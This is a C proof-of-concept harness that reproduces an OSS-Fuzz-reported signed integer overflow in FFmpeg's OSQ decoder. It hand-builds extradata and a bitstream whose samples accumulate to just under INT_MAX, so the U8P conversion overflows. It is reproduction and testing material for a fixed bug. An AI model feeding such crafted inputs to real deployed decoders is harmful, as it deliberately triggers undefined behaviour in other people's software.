/* PoC harness for OSSFUZZ-428055715: osq.c 32-bit sample overflow in
 * the U8P output conversion: dst[n] = av_clip_uint8(src[n] + 0x80);
 *
 * Builds a minimal OSQ decoder extradata + bitstream directly using the
 * project's own PutBitContext (LE writer, matching osq.c's
 * BITSTREAM_READER_LE GetBitContext bit-exactly), then feeds it straight
 * to the libavcodec OSQ decoder via avcodec_send_packet/avcodec_receive_frame.
 *
 * We construct a single-channel, U8P (8-bit) stream, coding_mode=3
 * (raw two's-complement signed residue of `residue_bits` bits, read via
 * get_sbits_long), prediction=1 (dst[n] += dst[n-1], a running
 * accumulator). By choosing large positive residues for a handful of
 * samples we drive the accumulated 32-bit sample value up to just under
 * INT_MAX without ever overflowing the accumulation itself, then let the
 * final decoded sample land within ~100 of INT_MAX so that
 * `src[n] + 0x80` (plain 32-bit int arithmetic) overflows signed 32-bit
 * range -- exactly the UBSan report in the fix commit ("signed integer
 * overflow: 2147483565 + 128 cannot be represented in type 'int'").
 *
 * Build passes -DHAVE_OSQ=0/1 explicitly (enum constants aren't visible
 * to the preprocessor, so we can't #ifdef on AV_CODEC_ID_OSQ itself).
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#define BITSTREAM_WRITER_LE
#include <libavcodec/avcodec.h>
#include <libavcodec/put_bits.h>
#include <libavutil/mem.h>

#ifndef HAVE_OSQ
#define HAVE_OSQ 0
#endif

/* get_urice(gb,k): x = get_unary(gb, stop=1, len=512)  (x zero-bits then a
 * terminating 1-bit); b = get_bits_long(gb,k); returns z = b | (x<<k). Used
 * for the channel-parameter fields (prediction/coding_mode/residue_bits). */
static void put_urice(PutBitContext *pb, uint32_t value, int k)
{
    uint32_t mask = (k < 32) ? ((1u << k) - 1) : 0xFFFFFFFFu;
    uint32_t x = value >> k;
    uint32_t b = value & mask;
    for (uint32_t i = 0; i < x; i++)
        put_bits(pb, 1, 0);
    put_bits(pb, 1, 1); /* unary stop bit */
    put_bits(pb, k, b);
}

/* Matches get_sbits_long(gb,n) = sign_extend(get_bits_long(gb,n), n): a
 * plain two's-complement n-bit field. This is what coding_mode==3 uses for
 * the per-sample residue (NOT get_srice). */
static void put_sbits_n(PutBitContext *pb, int32_t value, int n)
{
    uint32_t mask = (n < 32) ? ((1u << n) - 1) : 0xFFFFFFFFu;
    put_bits(pb, n, ((uint32_t)value) & mask);
}

int main(int argc, char **argv)
{
#if !HAVE_OSQ
    fprintf(stderr, "PoC-SKIP: AV_CODEC_ID_OSQ not present in this revision (decoder absent)\n");
    return 42;
#else
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_OSQ);
    if (!codec) {
        fprintf(stderr, "PoC-SKIP: OSQ decoder not found in registry\n");
        return 42;
    }

    const int frame_samples = 16;
    const int residue_bits = 30; /* coding_mode 3 uses raw residue_bits */

    /* ---- build extradata (48 bytes minimum) ---- */
    uint8_t extradata[48];
    memset(extradata, 0, sizeof(extradata));
    extradata[0] = 1;         /* version */
    extradata[2] = 8;         /* bit depth -> AV_SAMPLE_FMT_U8P */
    extradata[3] = 1;         /* nb_channels */
    uint32_t sr = 44100;
    memcpy(extradata + 4, &sr, 4);
    uint16_t fsz = (uint16_t)frame_samples;
    memcpy(extradata + 8, &fsz, 2);
    uint64_t nbs = frame_samples;
    memcpy(extradata + 16, &nbs, 8);

    /* ---- build the bitstream for one block/frame ---- */
    uint8_t bitbuf[4096];
    PutBitContext pb;
    init_put_bits(&pb, bitbuf, sizeof(bitbuf));

    put_bits(&pb, 1, 0); /* skip_bits1 */
    put_bits(&pb, 1, 0); /* decorrelate */
    put_bits(&pb, 1, 0); /* downsample */

    /* channel 0 parameters */
    put_urice(&pb, 1, 5);           /* prediction = 1 (dst[n] += dst[A]) */
    put_urice(&pb, 3, 3);           /* coding_mode = 3 */
    put_urice(&pb, residue_bits, 4);/* residue_bits = 30 */

    /* Drive the running accumulator (dst[n] = residue + dst[n-1]) up to
     * just under INT_MAX using large positive residues, then push the
     * very last sample within [INT_MAX-200, INT_MAX] so the U8P
     * conversion's "+0x80" overflows signed 32-bit range. */
    int64_t acc = 0;
    const int32_t big = (1 << (residue_bits - 1)) - 1; /* 0x1FFFFFFF */
    for (int n = 0; n < frame_samples; n++) {
        int32_t residue;
        int64_t target;
        if (n < frame_samples - 1) {
            /* keep accumulating with big steps while staying safely
             * below INT_MAX to avoid any earlier overflow */
            target = acc + big;
            if (target > (int64_t)INT32_MAX - big)
                residue = 0;
            else
                residue = big;
        } else {
            /* final sample: land within 200 of INT_MAX */
            int64_t want = (int64_t)INT32_MAX - 60; /* -> ~2147483587 */
            residue = (int32_t)(want - acc);
        }
        put_sbits_n(&pb, residue, residue_bits);
        acc += residue;
        fprintf(stderr, "sample[%d] residue=%d acc=%lld\n", n, residue, (long long)acc);
    }

    flush_put_bits(&pb);
    int bit_count = put_bits_count(&pb);
    int byte_count = (bit_count + 7) / 8;

    fprintf(stderr, "packet size=%d bytes, predicted final sample=%lld\n", byte_count, (long long)acc);

    /* ---- set up decoder ---- */
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) { fprintf(stderr, "alloc ctx failed\n"); return 1; }
    ctx->extradata = av_mallocz(48 + AV_INPUT_BUFFER_PADDING_SIZE);
    memcpy(ctx->extradata, extradata, 48);
    ctx->extradata_size = 48;
    ctx->ch_layout.order = AV_CHANNEL_ORDER_UNSPEC;
    ctx->ch_layout.nb_channels = 1;

    int ret = avcodec_open2(ctx, codec, NULL);
    if (ret < 0) {
        char errbuf[128];
        av_strerror(ret, errbuf, sizeof(errbuf));
        fprintf(stderr, "avcodec_open2 failed: %s\n", errbuf);
        return 1;
    }

    AVPacket *pkt = av_packet_alloc();
    if (av_new_packet(pkt, byte_count) < 0) { fprintf(stderr, "packet alloc failed\n"); return 1; }
    memcpy(pkt->data, bitbuf, byte_count);

    AVFrame *frame = av_frame_alloc();

    ret = avcodec_send_packet(ctx, pkt);
    fprintf(stderr, "send_packet ret=%d\n", ret);

    /* Signal EOF so osq_receive_frame proceeds to decode with the
     * (short, single-frame) buffered bitstream instead of blocking on
     * ff_decode_get_packet waiting for more input. */
    ret = avcodec_send_packet(ctx, NULL);
    fprintf(stderr, "send_packet(EOF) ret=%d\n", ret);

    ret = avcodec_receive_frame(ctx, frame);
    fprintf(stderr, "receive_frame ret=%d nb_samples=%d\n", ret, ret == 0 ? frame->nb_samples : -1);

    if (ret == 0 && frame->nb_samples > 0) {
        uint8_t *d = frame->extended_data[0];
        fprintf(stderr, "decoded u8 samples:");
        for (int i = 0; i < frame->nb_samples; i++)
            fprintf(stderr, " %d", d[i]);
        fprintf(stderr, "\n");
    }

    fprintf(stderr, "PoC-DONE\n");
    return 0;
#endif
}
